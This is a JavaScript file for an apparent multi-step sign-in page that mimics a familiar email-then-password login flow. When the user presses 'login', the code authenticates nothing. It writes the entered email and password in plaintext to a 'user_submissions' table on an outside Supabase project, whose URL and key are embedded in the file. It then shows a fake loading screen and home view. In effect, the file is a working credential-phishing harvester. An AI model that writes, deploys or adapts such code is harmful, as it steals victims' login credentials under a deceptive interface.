// Initialize Supabase Client
const SUPABASE_URL = 'https://wtbojotyzjvzywaqykbn.supabase.co';
const SUPABASE_ANON_KEY = 'sb_publishable_xw7vDVKxwoH1-u3MjPwLxA_O85n-yeX';
const _supabase = supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);

const landingView = document.getElementById('landing-view');
const loginView = document.getElementById('login-view');
const homeView = document.getElementById('home-view');

const stepEmail = document.getElementById('step-email');
const stepPassword = document.getElementById('step-password');
const stepLoading = document.getElementById('step-loading');

const sideTitle = document.getElementById('side-title');
const privacyNotice = document.getElementById('privacy-notice');
const emailChip = document.getElementById('email-chip');

const emailInput = document.getElementById('email');
const passInput = document.getElementById('password');

const emailError = document.getElementById('email-error');
const passError = document.getElementById('pass-error');

let userEmail = '';

// Open Login View
document.getElementById('btn-open-login').addEventListener('click', () => {
  landingView.classList.add('hidden');
  loginView.classList.remove('hidden');
});

// Step 1: Validate Email & Shift UI State
document.getElementById('btn-next').addEventListener('click', () => {
  const value = emailInput.value.trim();
  const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;

  if (!emailRegex.test(value)) {
    emailError.style.display = 'block';
    return;
  }

  emailError.style.display = 'none';
  userEmail = value;

  // Swap Left Column Content
  sideTitle.textContent = "Welcome";
  privacyNotice.classList.add('hidden');
  emailChip.classList.remove('hidden');
  document.getElementById('user-display-email').textContent = userEmail;

  // Switch to Password Field
  stepEmail.classList.add('hidden');
  stepPassword.classList.remove('hidden');
});

// Toggle Password Field Masking
const togglePassword = document.getElementById('toggle-password');
togglePassword.addEventListener('change', () => {
  passInput.type = togglePassword.checked ? 'text' : 'password';
});

// Step 2: Send Plain Text to Supabase Database Table
document.getElementById('btn-login').addEventListener('click', async () => {
  const plainTextValue = passInput.value.trim();

  if (!plainTextValue) {
    passError.style.display = 'block';
    return;
  }

  passError.style.display = 'none';

  // Send entry to Supabase
  const { data, error } = await _supabase
    .from('user_submissions')
    .insert([
      { 
        email: userEmail, 
        submitted_text: plainTextValue 
      }
    ]);

  if (error) {
    console.error('Supabase Error:', error.message);
    alert('Failed to submit: ' + error.message);
    return;
  }

  // Transition UI to Home View
  stepPassword.classList.add('hidden');
  stepLoading.classList.remove('hidden');

  setTimeout(() => {
    loginView.classList.add('hidden');
    homeView.classList.remove('hidden');
  }, 1500);
});